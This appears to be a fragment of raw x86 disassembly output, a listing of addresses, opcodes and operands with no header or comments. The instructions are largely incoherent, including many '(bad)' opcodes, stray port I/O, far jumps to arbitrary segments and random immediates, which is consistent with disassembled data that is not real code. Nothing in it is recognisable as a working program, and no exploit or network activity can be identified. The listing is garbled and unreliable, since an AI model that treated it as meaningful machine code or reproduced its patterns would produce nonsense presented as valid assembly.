  4810da:	je     0x48111c
  4810dc:	adc    DWORD PTR [edi-0x444862aa],ebp
  4810e2:	imul   BYTE PTR [eax]
  4810e4:	xor    edx,DWORD PTR [eax+ebp*8+0x1a]
  4810e8:	sub    al,0xa2
  4810ea:	lea    ecx,[eax+esi*8+0xd]
  4810ee:	sbb    ebx,0x6068ba2c
  4810f4:	loop   0x48112a
  4810f6:	jg     0x48116c
  4810f8:	or     DWORD PTR [ebx-0x7fb0f909],ecx
  4810fe:	mov    ds:0x13fb2cd0,ax
  481104:	adc    BYTE PTR [eax],dh
  481106:	mov    esi,0x6c646d0f
  48110b:	addr16 pop edi
  48110d:	push   0x404978e7
  481112:	ficomp DWORD PTR [edi]
  481114:	mov    al,0xc0
  481116:	mov    es,WORD PTR ds:0x6c70ae2d
  48111c:	cmp    dl,BYTE PTR [edi+0x14]
  48111f:	jo     0x481150
  481121:	pop    eax
  481122:	or     BYTE PTR [edx+0x63],bh
  481125:	push   eax
  481126:	retf   0x2e25
  481129:	cmp    BYTE PTR [eax+0x7],bl
  48112c:	add    ebx,DWORD PTR gs:[edi]
  48112f:	mov    bl,BYTE PTR [edi]
  481131:	cmp    al,0x6a
  481133:	sbb    edi,ecx
  481135:	cmp    al,0xd3
  481137:	pop    esi
  481138:	outs   dx,DWORD PTR ds:[esi]
  481139:	push   ss
  48113a:	cmp    ah,dh
  48113c:	jno    0x481172
  48113e:	cs cmp al,0x23
  481141:	(bad)  
  481143:	aam    0x30
  481145:	push   ss
  481146:	in     al,dx
  481147:	jb     0x481175
  481149:	or     al,0x27
  48114b:	out    dx,eax
  48114c:	in     al,0x9d
  48114e:	sub    BYTE PTR [esi-0x50],bl
  481151:	and    al,0x2e
  481153:	mov    WORD PTR [eax],fs
  481155:	out    dx,eax
  481156:	in     al,0x9d
  481158:	cmp    al,0x8
  48115a:	sbb    al,0x16
  48115c:	enter  0x2e18,0x30
  481160:	cmp    eax,0x14273e47
  481165:	pop    eax
  481166:	jae    0x481148
  481168:	imul   esi,DWORD PTR [eax-0x25],0x1799f233
  48116f:	(bad)  
  481171:	jb     0x48114b
  481173:	adc    BYTE PTR [edi-0x32],al
  481176:	sub    ebp,0x775ed484
  48117c:	pop    ss
  48117d:	xchg   BYTE PTR [ecx+0x43ab0ca7],ch
  481183:	jo     0x481176
  481185:	in     al,0xb7
  481187:	add    al,BYTE PTR [eax+0x482d3d43]
  48118d:	mov    ax,ds:0xf80b6211
  481193:	pop    es
  481194:	push   edi
  481195:	nop
  481196:	mov    eax,0x38a669e8
  48119b:	nop
  48119c:	daa    
  48119d:	nop
  48119e:	or     ecx,DWORD PTR [ebp+0x767042a9]
  4811a4:	loop   0x481198
  4811a6:	inc    esi
  4811a7:	das    
  4811a8:	xor    edi,DWORD PTR [eax+0x670a87c]
  4811ae:	xchg   edi,eax
  4811af:	fsubr  st(4),st
  4811b1:	inc    ebp
  4811b2:	sbb    BYTE PTR [ecx],dl
  4811b4:	cmp    DWORD PTR [ebp+0x2a],ecx
  4811b7:	push   esp
  4811b8:	and    dl,BYTE PTR [eax-0x5c9f8d96]
  4811be:	pop    ds
  4811bf:	nop
  4811c0:	xchg   ebp,eax
  4811c1:	xchg   esp,edi
  4811c3:	add    DWORD PTR cs:[edx-0x757b7580],ebp
  4811ca:	(bad)  
  4811cc:	test   DWORD PTR [eax+ecx*1+0x27f780aa],edi
  4811d3:	push   0xf5a63240
  4811d8:	push   0xe85bce5e
  4811dd:	jl     0x481244
  4811df:	push   eax
  4811e0:	pop    ds
  4811e1:	jle    0x481193
  4811e3:	jo     0x48117c
  4811e5:	add    bh,BYTE PTR [ecx-0x7fc0865]
  4811eb:	inc    edi
  4811ec:	pop    ebx
  4811ed:	xchg   ebp,eax
  4811ee:	and    BYTE PTR [eax+0x69],dl
  4811f1:	arpl   WORD PTR [edx+edx*1-0x50],cx
  4811f5:	cmp    eax,0x8e171f33
  4811fa:	or     DWORD PTR [edi-0x5576a0df],ebp
  481200:	ja     0x48118a
  481202:	mov    al,ds:0x904bc85c
  481207:	stos   BYTE PTR es:[edi],al
  481208:	mov    BYTE PTR [edx-0xf87f6b6],bh
  48120e:	fld    QWORD PTR [edi+0x17]
  481211:	stos   DWORD PTR es:[edi],eax
  481212:	or     DWORD PTR [eax-0x77],edi
  481215:	ret    0x1e2f
  481218:	mov    al,ds:0xfc903fc
  48121d:	out    0xc8,al
  48121f:	inc    ebx
  481220:	rcl    al,1
  481222:	inc    ebx
  481223:	add    BYTE PTR [eax],ah
  481225:	rol    DWORD PTR [ebx+0x3c],1
  481228:	and    al,0xff
  48122a:	nop
  48122b:	nop
  48122c:	retf   0x43
  48122f:	in     al,dx
  481230:	aad    0x43
  481232:	nop
  481233:	stos   DWORD PTR es:[edi],eax
  481234:	inc    edx
  481235:	fwait
  481236:	ins    DWORD PTR es:[edi],dx
  481237:	cmp    eax,DWORD PTR [eax+0x1456cbe4]
  48123d:	aam    0x6
  48123f:	lods   al,BYTE PTR ds:[esi]
  481240:	shr    eax,cl
  481242:	(bad)  
  481243:	mov    bl,0xb1
  481245:	xor    BYTE PTR [esi],dh
  481247:	or     edx,DWORD PTR [esp+ebx*1+0x1b]
  48124b:	icebp  
  48124c:	pusha  
  48124d:	pusha  
  48124e:	das    
  48124f:	popw   es
  481251:	and    eax,ebp
  481253:	test   al,0x28
  481255:	leave  
  481256:	out    0x1d,al
  481258:	and    al,0xb3
  48125a:	mov    al,ds:0x74634147
  48125f:	outs   dx,BYTE PTR ds:[esi]
  481260:	inc    ebx
  481261:	ja     0x48129d
  481263:	mov    WORD PTR [eax+esi*8-0x3ff97584],ss
  48126a:	and    eax,0xb773756a
  48126f:	mov    al,ds:0xc02bf801
  481274:	js     0x48123c
  481276:	inc    esi
  481277:	pusha  
  481278:	xchg   DWORD PTR [eax+0x26],eax
  48127b:	jns    0x481240
  48127d:	iret   
  48127e:	icebp  
  48127f:	stos   DWORD PTR es:[edi],eax
  481280:	mov    WORD PTR [ebx+0x2c],fs
  481283:	inc    ebx
  481284:	jb     0x48127e
  481286:	stos   DWORD PTR es:[edi],eax
  481287:	mov    WORD PTR [esi-0x67df4593],gs
  48128d:	push   es
  48128e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48128f:	loopne 0x481235
  481291:	js     0x4812ba
  481293:	inc    edi
  481294:	mov    ds,WORD PTR [edi+ecx*1+0x60a2f8a1]
  48129b:	mov    ds:0x91c9e874,eax
  4812a0:	xchg   ebx,eax
  4812a1:	and    ebx,DWORD PTR [esi+0x309fb8a4]
  4812a7:	fist   DWORD PTR [ebx-0x272b3627]
  4812ad:	jg     0x48124f
  4812af:	mov    eax,ds:0x17c80fa8
  4812b4:	test   BYTE PTR [ebx-0x1f453754],dl
  4812ba:	adc    eax,0xe0320cbc
  4812bf:	loopne 0x48133e
  4812c1:	lods   al,BYTE PTR ds:[esi]
  4812c2:	pop    esi
  4812c3:	xchg   edi,esp
  4812c5:	jns    0x481265
  4812c7:	out    0x6,eax
  4812c9:	xchg   ecx,eax
  4812ca:	xor    eax,0x9e4d453d
  4812cf:	out    0x79,eax
  4812d1:	sahf   
  4812d2:	push   ebp
  4812d3:	pop    ebp
  4812d4:	gs ins DWORD PTR es:[edi],dx
  4812d6:	jne    0x4812ed
  4812d8:	js     0x481278
  4812da:	out    0x79,eax
  4812dc:	sbb    eax,0x30d2d25
  4812e1:	xchg   DWORD PTR [edi],esi
  4812e3:	push   ebp
  4812e4:	sbb    BYTE PTR [edi-0x64],ch
  4812e7:	cs and cl,bh
  4812ea:	js     0x481271
  4812ec:	dec    esp
  4812ed:	mov    ah,0x37
  4812ef:	test   BYTE PTR fs:[ebp-0x3313d2f3],ch
  4812f6:	ss push ds
  4812f8:	pop    ss
  4812f9:	add    DWORD PTR [esi-0x1efa2ac3],ebx
  4812ff:	es and al,0xff
  481302:	and    al,0xb8
  481304:	inc    edx
  481305:	adc    DWORD PTR [eax+0x149f65b8],ebx
  48130b:	int3   
  48130c:	adc    BYTE PTR [esi+0x56],bl
  48130f:	jmp    0x224b:0x540e32ac
  481316:	push   ss
  481317:	inc    ecx
  481318:	or     BYTE PTR [edi+0x62785b2a],ch
  48131e:	jae    0x481385
  481320:	scas   al,BYTE PTR es:[edi]
  481321:	inc    edx
  481322:	shl    DWORD PTR [eax-0x73f3f2c6],0x13
  481329:	mov    dl,0x92
  48132b:	les    ebx,FWORD PTR [esi-0x7f72f247]
  481331:	inc    ebx
  481332:	sbb    al,0x53
  481334:	mov    ebx,0x66172041
  481339:	push   ss
  48133a:	pusha  
  48133b:	add    cl,cl
  48133d:	push   ss
  48133e:	pop    edx
  48133f:	nop
  481340:	mov    cl,BYTE PTR [ebx+0x69]
  481343:	xchg   BYTE PTR [ebp+0x6e],dh
  481346:	mov    eax,ds:0x2b204f15
  48134b:	and    eax,0xdddae0f8
  481350:	push   cs
  481351:	sbb    al,0xa2
  481353:	clc    
  481354:	push   0xfc0ece7c
  481359:	mov    ecx,ds
  48135b:	ret    0x818
  48135e:	stc    
  48135f:	imul   ecx,DWORD PTR [eax],0x6cd95537
  481365:	dec    esp
  481366:	mov    BYTE PTR [eax],bl
  481368:	and    al,BYTE PTR [eax+0x61]
  48136b:	add    BYTE PTR [esi],bl
  48136d:	jecxz  0x48136f
  48136f:	scas   al,BYTE PTR es:[edi]
  481370:	das    
  481371:	pop    esp
  481372:	daa    
  481373:	sub    BYTE PTR [ebx],al
  481375:	mul    ah
  481377:	punpcklwd mm2,DWORD PTR [ebx]
  48137a:	mov    edx,DWORD PTR [ebx+0xc]
  48137d:	adc    al,0x8d
  48137f:	push   cs
  481380:	shl    BYTE PTR [ebx+eiz*1+0x4eb73d0b],0xda
  481388:	add    al,al
  48138a:	aaa    
  48138b:	xor    BYTE PTR [esi+0x1e],bh
  48138e:	fistp  DWORD PTR [ebx+0x21]
  481391:	mov    BYTE PTR [esp+edx*2+0x7],bh
  481395:	and    ebp,DWORD PTR [edi-0x794d7abe]
  48139b:	rol    dl,1
  48139d:	sub    cl,BYTE PTR [ebp+0x40d39d13]
  4813a3:	sbb    dh,0x2d
  4813a6:	(bad)  
  4813a7:	mov    eax,ds:0xc40e12d6
  4813ac:	sub    dl,cl
  4813ae:	jmp    0x4813e2
  4813b0:	nop
  4813b1:	outs   dx,BYTE PTR ds:[esi]
  4813b2:	or     DWORD PTR [ecx],eax
  4813b4:	lea    ebx,[eax-0x37]
  4813b7:	and    ebx,ebp
  4813b9:	sub    ch,BYTE PTR [edi-0x4a462d81]
  4813bf:	mov    al,BYTE PTR [edi]
  4813c1:	test   ch,dh
  4813c3:	mov    esp,0x470c18e0
  4813c8:	adc    dl,dl
  4813ca:	jns    0x4813e4
  4813cc:	pop    ebx
  4813cd:	mov    ch,0x81
  4813cf:	push   0xffffffaa
  4813d1:	cmp    BYTE PTR ds:0x3665381e,cl
  4813d7:	add    al,0x1
  4813d9:	xchg   BYTE PTR [eax],al
  4813db:	mov    ecx,esp
  4813dd:	jne    0x481390
  4813df:	aam    0x7c
  4813e1:	push   edi
  4813e2:	lods   eax,DWORD PTR ds:[esi]
  4813e3:	in     al,0x31
  4813e5:	pop    esp
  4813e6:	or     DWORD PTR [edi+0x38],ecx
  4813e9:	lods   eax,DWORD PTR ds:[esi]
  4813ea:	ret    
  4813eb:	scas   eax,DWORD PTR es:[edi]
  4813ec:	pop    ebp
  4813ed:	fsub   DWORD PTR [eax+0xb]
  4813f0:	push   eax
  4813f1:	mov    cl,0xef
  4813f3:	and    BYTE PTR [edi],ah
  4813f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4813f6:	sar    DWORD PTR [edx],1
  4813f8:	dec    eax
  4813f9:	(bad)  
  4813fa:	sbb    eax,0x4fe39c86
  4813ff:	dec    ebx
  481400:	push   edi
  481401:	mov    al,0x21
  481403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  481404:	in     al,dx
  481405:	xor    al,bh
  481407:	xchg   eax,esi
  481409:	add    bh,BYTE PTR ds:0x21043c6
  48140f:	pop    ss
  481410:	inc    edi
  481411:	arpl   bx,ax
  481413:	shl    DWORD PTR [esi+eax*4],0x64
  481417:	popa   
  481418:	test   BYTE PTR [ebx+eiz*2-0x3f],al
  48141c:	dec    ecx
  48141d:	pop    ss
  48141e:	add    ecx,DWORD PTR ds:0x6e800692
  481424:	dec    esi
  481425:	je     0x4813a8
  481427:	cmp    al,0x82
  481429:	xchg   esi,eax
  48142a:	xor    DWORD PTR [eax],0x1ab05e35
  481430:	fsub   DWORD PTR [eax+0x68]
  481433:	aaa    
  481434:	jmp    0xa767:0x170ed603
  48143b:	adc    ebx,0xb15c7b2c
  481441:	dec    ebx
  481442:	dec    esi
  481443:	add    edx,DWORD PTR [edi]
  481445:	or     eax,0x4b920f6
  48144a:	lods   al,BYTE PTR ds:[esi]
  48144b:	and    ecx,DWORD PTR [ecx]
  48144d:	das    
  48144e:	inc    esp
  48144f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  481450:	into   
  481451:	mov    DWORD PTR [ebp+0x4e],esi
  481454:	push   edx
  481455:	jno    0x4814c3
  481457:	mov    ds:0x45e49e0b,al
  48145c:	in     al,0x3
  48145e:	mov    WORD PTR [ebx-0x7db59afa],es
  481464:	das    
  481465:	push   edx
  481466:	test   DWORD PTR [eax-0x658b4800],0x6094c333
  481470:	dec    eax
  481471:	cmp    ebx,DWORD PTR [eax+0x64]
  481474:	clc    
  481475:	xchg   esi,eax
  481476:	adc    DWORD PTR [edi],0x3b6bb330
  48147c:	dec    eax
  48147d:	scas   al,BYTE PTR es:[edi]
  48147e:	ins    DWORD PTR es:[edi],dx
  48147f:	jmp    0x34a9ca25
  481484:	or     al,BYTE PTR [ecx]
  481486:	jecxz  0x481499
  481488:	test   BYTE PTR [eax-0x22],cl
  48148b:	xchg   ebx,eax
  48148c:	(bad)  [eax+0x2]
  48148f:	pop    DWORD PTR [edi]
  481491:	dec    ecx
  481492:	shr    DWORD PTR [edx],0xf8
  481495:	clc    
  481496:	arpl   WORD PTR [ecx+0xc031357],si
  48149c:	dec    ebx
  48149d:	in     al,0x9
  48149f:	jecxz  0x4814a0
  4814a1:	aas    
  4814a2:	push   ebx
  4814a3:	loop   0x481450
  4814a5:	mov    bh,0x37
  4814a7:	inc    ebp
  4814a8:	sub    BYTE PTR [ecx+0x4c],al
  4814ab:	sub    BYTE PTR [edx],ah
  4814ad:	and    eax,0x342c2273
  4814b2:	(bad)  
  4814b4:	outs   dx,BYTE PTR ds:[esi]
  4814b5:	out    dx,eax
  4814b6:	sub    DWORD PTR [edx+eiz*1],ebp
  4814b9:	push   ss
  4814ba:	pop    esp
  4814bb:	sbb    BYTE PTR [eax],dh
  4814bd:	cmp    dh,BYTE PTR [ebx+0xa]
  4814c0:	sub    al,0x33
  4814c2:	sub    DWORD PTR [edx],esp
  4814c4:	and    BYTE PTR [edx+0x4b],cl
  4814c7:	sub    al,0x59
  4814c9:	fcom   DWORD PTR [edx+0x31]
  4814cc:	xor    ebp,DWORD PTR [esi]
  4814ce:	jle    0x4814d0
  4814d0:	icebp  
  4814d1:	cmp    esp,DWORD PTR [esi]
  4814d3:	push   eax
  4814d4:	or     al,0xc3
  4814d6:	mov    BYTE PTR [eax+0x10],0xfe
  4814da:	add    ch,BYTE PTR [eax-0x38]
  4814dd:	mov    edx,0xecec0e02
  4814e2:	adc    BYTE PTR ds:0xe98510af,dl
  4814e8:	push   0x27810897
  4814ed:	mov    ebp,DWORD PTR [ecx]
  4814ef:	dec    ebp
  4814f0:	out    dx,al
  4814f1:	or     bh,BYTE PTR [eax+0x307fa70f]
  4814f7:	test   DWORD PTR [ecx+ecx*8],ecx
  4814fa:	push   ebp
  4814fb:	mov    dl,0x1f
  4814fd:	adc    BYTE PTR [ecx+0x4c],bh
  481500:	iret   
  481501:	adc    bh,BYTE PTR [ebp+0x63]
  481504:	pop    esp
  481505:	mov    dl,0x5e
  481507:	pop    ebx
  481508:	ret    0x6708
  48150b:	lock and BYTE PTR [edi-0x6f],ch
  48150f:	inc    ecx
  481510:	lock in eax,dx
  481512:	pop    edx
  481513:	mov    bl,0xbe
  481515:	sub    ah,BYTE PTR ds:0x4bb589e0
  48151b:	mov    ecx,0xd2f0b368
  481520:	mov    esp,0xfefcd630
  481525:	(bad)  
  481526:	jg     0x4814e8
  481528:	jecxz  0x481567
  48152a:	mov    al,BYTE PTR [ecx+0x31]
  48152d:	fldcw  WORD PTR [ebx+0x6a]
  481530:	push   eax
  481531:	lock mov eax,0x696d6c81
  481537:	cld    
  481538:	(bad)  
  481539:	sub    ebp,DWORD PTR [ebp-0xcafcb88]
  48153f:	inc    eax
  481540:	mov    ebx,0x568af33a
  481545:	mov    eax,fs:0xf9ffdd5f
  48154b:	ins    BYTE PTR es:[edi],dx
  48154c:	or     DWORD PTR [edi],ecx
  48154e:	cs popa 
  481550:	cmp    eax,0x3f8a16f0
  481555:	shl    DWORD PTR [ecx+0x706d754a],1
  48155b:	dec    ecx
  48155c:	inc    esp
  48155d:	call   0x12d99f1e
  481562:	cs out dx,al
  481564:	sub    DWORD PTR [edi],ebx
  481566:	sbb    al,0xe4
  481568:	pop    ebp
  481569:	push   cs
  48156a:	sbb    eax,0xb3b3da95
  48156f:	add    DWORD PTR [ebp+0xf50d18c],edx
  481575:	push   ds
  481576:	mov    BYTE PTR [ebx+0xe],ch
  481579:	xchg   DWORD PTR [ebp+eax*4+0x11],edi
  48157d:	clc    
  48157e:	mov    edx,edi
  481580:	adc    al,0x8b
  481582:	nop
  481583:	adc    cl,dh
  481585:	add    eax,0x915e115
  48158a:	inc    edx
  48158b:	mov    cl,dh
  48158d:	inc    edi
  48158e:	xchg   ecx,eax
  48158f:	jl     0x481599
  481591:	jnp    0x4815ff
  481593:	mov    ah,0xd9
  481595:	mov    al,ds:0xb0dcd78b
  48159a:	enter  0x37c4,0x29
  48159e:	imul   esp,DWORD PTR [edi],0xffffffa0
  4815a1:	mov    dh,al
  4815a3:	mov    ecx,0x81189421
  4815a8:	pop    ss
  4815a9:	or     eax,0x73393e07
  4815ae:	mov    ah,0xb0
  4815b0:	jo     0x4815de
  4815b2:	cmp    BYTE PTR [ebx],al
  4815b4:	inc    DWORD PTR [ebx]
  4815b6:	pop    ebx
  4815b7:	jmp    0xb4f79ad2
  4815bc:	adc    BYTE PTR [ecx+0x46],bh
  4815bf:	inc    ebx
  4815c0:	addr16 mov ch,0x42
  4815c3:	icebp  
  4815c4:	or     bl,BYTE PTR [edi-0x50]
  4815c7:	repnz and eax,0x6a96840f
  4815cd:	cmp    edi,0x409e69e1
  4815d3:	xor    al,0x1a
  4815d5:	or     al,0x5
  4815d7:	and    BYTE PTR [ecx],al
  4815d9:	xchg   DWORD PTR [ecx],ecx
  4815db:	mov    eax,0x198ab409
  4815e0:	push   0x740a77e7
  4815e5:	adc    ecx,DWORD PTR [edx]
  4815e7:	or     BYTE PTR [ebp+ecx*1+0x30],dh
  4815eb:	pop    es
  4815ec:	rol    ecx,0xd6
  4815ef:	inc    edi
  4815f0:	jae    0x48160d
  4815f2:	jmp    0x481577
  4815f4:	test   BYTE PTR [edi-0x2f8d38d8],cl
  4815fa:	in     eax,0x30
  4815fc:	xchg   edi,eax
  4815fd:	sbb    BYTE PTR [ecx+0x4721489d],0xd9
  481604:	nop
  481605:	mov    dh,0xb0
  481607:	call   0x9976:0x1214f044
  48160e:	imul   edx,DWORD PTR [esi+0x15],0xcad15349
  481615:	ret    
  481616:	push   eax
  481617:	add    ah,ch
  481619:	clc    
  48161a:	cmp    eax,DWORD PTR [eax]
  48161c:	loop   0x4815bf
  48161e:	xchg   esp,eax
  48161f:	fucomi st,st(0)
  481621:	xchg   edi,eax
  481622:	add    BYTE PTR [edi+ebx*8],0xbe
  481626:	fild   DWORD PTR [ebx+0x25]
  481629:	int    0x43
  48162b:	inc    esp
  48162c:	stos   DWORD PTR es:[edi],eax
  48162d:	outs   dx,BYTE PTR ds:[esi]
  48162e:	mov    ch,0x42
  481630:	in     al,dx
  481631:	adc    dl,dh
  481633:	add    BYTE PTR [ebx-0x69],ah
  481636:	sub    al,0x29
  481638:	lods   al,BYTE PTR ds:[esi]
  481639:	push   edx
  48163a:	out    dx,eax
  48163b:	ins    DWORD PTR es:[edi],dx
  48163c:	inc    ecx
  48163d:	arpl   WORD PTR [ebp-0x80],ax
  481640:	daa    
  481641:	inc    ecx
  481642:	mov    esp,0xa0cfeee7
  481647:	mov    edx,0x1e2395cc
  48164c:	jp     0x481679
  48164e:	mov    WORD PTR [eax+0xd0191c],es
  481654:	or     al,0x1
  481656:	fcomp  DWORD PTR [ebp+ecx*1+0x34068ab4]
  48165d:	frstor [ebx+0x5a0ffea3]
  481663:	scas   al,BYTE PTR es:[edi]
  481664:	pop    edi
  481665:	push   edi
  481666:	dec    ecx
  481667:	dec    esi
  481668:	dec    eax
  481669:	inc    ebp
  48166a:	dec    esp
  48166b:	inc    edx
  48166c:	repnz xchg edx,eax
  48166e:	add    esi,DWORD PTR [eax]
  481670:	mov    bh,0x28
  481672:	mov    dh,0x79
  481674:	in     al,dx
  481675:	pop    edi
  481676:	dec    eax
  481677:	imul   ebx,DWORD PTR [ebx-0x41fef250],0x8
  48167e:	mov    dh,0xd
  481680:	and    esi,DWORD PTR [ebx]
  481682:	xor    cl,BYTE PTR [eax+0x37d4a5d7]
  481688:	aaa    
  481689:	ret    0xcfe
  48168c:	push   es
  48168d:	or     eax,0xa63088a0
  481692:	icebp  
  481693:	mov    esi,0x4bac287c
  481698:	fnstsw WORD PTR [ecx+ebx*4]
  48169b:	pop    eax
  48169c:	pop    ss
  48169d:	push   edi
  48169e:	add    al,0x21
  4816a0:	pop    es
  4816a1:	push   ebp
  4816a2:	arpl   dx,ax
  4816a4:	loope  0x4816af
  4816a6:	add    DWORD PTR [ebx-0x3ee0b14a],edx
  4816ac:	clc    
  4816ad:	xor    DWORD PTR [esi],0xffffff8e
  4816b0:	pop    edx
  4816b1:	pusha  
  4816b2:	inc    DWORD PTR [eax+0x5e3a29f4]
  4816b8:	(bad)  
  4816b9:	fnstcw WORD PTR [edi+0x247510e1]
  4816bf:	cmp    BYTE PTR [ecx],al
  4816c1:	jb     0x4816d8
  4816c3:	jne    0x4816e2
  4816c5:	mov    edx,DWORD PTR [esi+0x14]
  4816c8:	ins    DWORD PTR es:[edi],dx
  4816c9:	jo     0x48172b
  4816cb:	jle    0x48167d
  4816cd:	rol    DWORD PTR [esi-0x4d14a924],1
  4816d3:	cmp    eax,DWORD PTR [esi+0x18]
  4816d6:	fwait
  4816d7:	xchg   edx,eax
  4816d8:	(bad)  
  4816d9:	loope  0x4816f2
  4816db:	stos   DWORD PTR es:[edi],eax
  4816dc:	leave  
  4816dd:	mov    dh,0x8a
  4816df:	punpcklwd mm6,DWORD PTR ds:0xe886cd08
  4816e7:	xchg   esi,eax
  4816e8:	imul   eax,DWORD PTR [eax-0x3a],0xfffffff0
  4816ec:	add    BYTE PTR [ebx-0x30],dl
  4816ef:	inc    eax
  4816f0:	dec    ebp
  4816f1:	fsub   QWORD PTR [eax-0x1fbc8b84]
  4816f7:	jns    0x48176f
  4816f9:	aaa    
  4816fa:	lock stos BYTE PTR es:[edi],al
  4816fc:	les    eax,FWORD PTR [eax+0x78]
  4816ff:	or     ch,BYTE PTR [edx-0x1f8ca5d4]
  481705:	adc    al,0x3c
  481707:	add    al,0xc4
  481709:	sahf   
  48170a:	fmul   DWORD PTR [edx+0x5c]
  48170d:	pushf  
  48170e:	mov    WORD PTR [esi],ds
  481710:	inc    edx
  481711:	adc    BYTE PTR [ecx+0x404bd9e8],bh
  481717:	cmp    DWORD PTR [edx],ebp
  481719:	into   
  48171a:	aam    0x61
  48171c:	pop    esp
  48171d:	loope  0x481716
  48171f:	ret    0x16b0
  481722:	sbb    esp,edx
  481724:	adc    BYTE PTR ds:0xa2154ca7,0x6e
  48172b:	inc    ebp
  48172c:	cld    
  48172d:	mov    edx,0x2f25819f
  481732:	xor    eax,esi
  481734:	xor    ch,cl
  481736:	mov    bh,0x9a
  481738:	xor    BYTE PTR [ebp+0x48],bh
  48173b:	cs push ds
  48173d:	pusha  
  48173e:	hlt    
  48173f:	jl     0x481745
  481741:	(bad)  
  481742:	push   ds
  481743:	sbb    eax,0xc32b1b40
  481748:	cmp    eax,0x74eb76f2
  48174d:	xor    BYTE PTR [ecx+0x2],ah
  481750:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  481751:	(bad)  
  481752:	cmc    
  481753:	or     DWORD PTR [edx],eax
  481755:	push   ds
  481756:	and    bl,dl
  481758:	rol    DWORD PTR [esi-0x2c],0xb7
  48175c:	test   al,0x34
  48175e:	nop
  48175f:	loopne 0x481734
  481761:	xlat   BYTE PTR ds:[ebx]
  481762:	pop    edi
  481763:	adc    bh,BYTE PTR [edx+0x3d]
  481766:	mov    eax,0xa7d67da0
  48176b:	retf   
  48176c:	ret    0x84a5
  48176f:	loopne 0x4816f6
  481771:	xchg   edx,eax
  481772:	test   eax,0xf22faad0
  481777:	pushf  
  481778:	cld    
  481779:	push   eax
  48177a:	mov    al,ds:0xbefe6fcb
  48177f:	mov    eax,0x873ee190
  481784:	cwde   
  481785:	inc    edi
  481786:	mov    eax,ds:0xe21c1c6f
  48178b:	std    
  48178c:	div    BYTE PTR [edx+ecx*1+0x15]
  481790:	clc    
  481791:	jl     0x4817a0
  481793:	(bad)  
  481794:	inc    esi
  481795:	add    al,0x23
  481797:	and    DWORD PTR ds:0x76949827,esi
  48179d:	and    eax,0x6f3ba4db
  4817a2:	mov    WORD PTR [edx+eax*1+0x17b8c572],ss
  4817a9:	pop    ebp
  4817aa:	js     0x4817ba
  4817ac:	repnz sbb bh,BYTE PTR [ecx+0x2a8a9842]
  4817b3:	sahf   
  4817b4:	cmp    al,ah
  4817b6:	mov    al,ds:0x4f181a85
  4817bb:	fdivr  DWORD PTR [ecx+0x6]
  4817be:	adc    BYTE PTR [edi-0x68],cl
  4817c1:	adc    eax,eax
  4817c3:	aaa    
  4817c4:	mov    cl,BYTE PTR [esi]
  4817c6:	in     al,0xb1
  4817c8:	fild   WORD PTR [bp+si]
  4817cb:	and    eax,0xb921b748
  4817d0:	sub    BYTE PTR [esi-0x38],ch
  4817d3:	inc    eax
  4817d4:	jmp    0xddc9ddf5
  4817d9:	and    DWORD PTR [edx+0x44903394],esp
  4817df:	aaa    
  4817e0:	pop    es
  4817e1:	add    DWORD PTR [edi+ebx*1-0x5c],esp
  4817e5:	push   esp
  4817e6:	or     DWORD PTR [edx],eax
  4817e8:	sub    DWORD PTR [edi+0x11],ecx
  4817eb:	clc    
  4817ec:	mov    esi,0x32e5c86
  4817f1:	push   es
  4817f2:	mov    bh,0x63
  4817f4:	imul   eax,DWORD PTR [ebx],0xffffffa5
  4817f7:	and    DWORD PTR [edi],esp
  4817f9:	add    BYTE PTR [ecx+ebp*2+0x68],ch
  4817fd:	push   es
  4817fe:	popa   
  4817ff:	xchg   ebx,eax
  481800:	add    eax,0x65c61
  481805:	sbb    eax,0x2a09611b
  48180a:	jmp    0x4950bdc1
  48180f:	popa   
  481810:	ins    BYTE PTR es:[edi],dx
  481811:	popa   
  481812:	dec    esp
  481813:	popf   
  481814:	dec    ecx
  481815:	outs   dx,DWORD PTR ds:[esi]
  481816:	jo     0x481894
  481818:	adc    BYTE PTR [ebx-0x66],dl
  48181b:	dec    ebx
  48181c:	cli    
  48181d:	in     eax,dx
  48181e:	or     BYTE PTR [edi],ah
  481820:	jae    0x4817b4
  481822:	fiadd  WORD PTR [ecx-0x4e]
  481825:	sahf   
  481826:	add    BYTE PTR [edx+0x7343e24],bh
  48182c:	enter  0xd3f,0x9f
  481830:	cmp    al,0xe2
  481832:	inc    edx
  481833:	add    BYTE PTR [edx+eiz*8],ch
  481836:	inc    edx
  481837:	loopne 0x481806
  481839:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48183a:	push   ebp
  48183b:	add    DWORD PTR [esi-0x1f],esi
  48183e:	push   es
  48183f:	mov    ah,0xb8
  481841:	loopne 0x48185f
  481843:	lahf   
  481844:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  481845:	stc    
  481846:	cmp    al,0x7c
  481848:	shl    cl,1
  48184a:	aam    0xdc
  48184c:	or     edx,DWORD PTR [esi+ebx*1+0x40]
  481850:	pop    eax
  481851:	inc    edx
  481852:	dec    edx
  481853:	popa   
  481854:	xor    al,0x20
  481856:	jo     0x48185e
  481858:	div    BYTE PTR [esi-0x2fffdef9]
  48185e:	pusha  
  48185f:	add    al,0xc7
  481861:	das    
  481862:	inc    ebp
  481863:	jmp    DWORD PTR [esi+ecx*8+0x475173c3]
  48186a:	sar    BYTE PTR [esp],1
  48186d:	mov    ah,0x39
  48186f:	and    DWORD PTR [edi-0x1d37b8f6],eax
  481875:	jo     0x481859
  481877:	sub    al,0xe0
  481879:	mov    ebp,0x4c269c29
  48187e:	push   es
  48187f:	push   ss
  481880:	or     BYTE PTR [ebx],cl
  481882:	or     al,0x2e
  481884:	in     al,dx
  481885:	gs cmp eax,0x60cc161b
  48188b:	push   es
  48188c:	iret   
  48188d:	in     al,dx
  48188e:	outs   dx,DWORD PTR ds:[esi]
  48188f:	cmp    DWORD PTR [edi+0x570d7041],eax
  481895:	xor    BYTE PTR [esi],al
  481897:	test   esi,ecx
  481899:	lahf   
  48189a:	out    0x44,al
  48189c:	shr    DWORD PTR [eax-0x45],0x87
  4818a0:	xchg   esp,eax
  4818a1:	mov    ebx,0x21ba5840
  4818a6:	fwait
  4818a7:	adc    esp,DWORD PTR [eax]
  4818a9:	cld    
  4818aa:	loop   0x4818c0
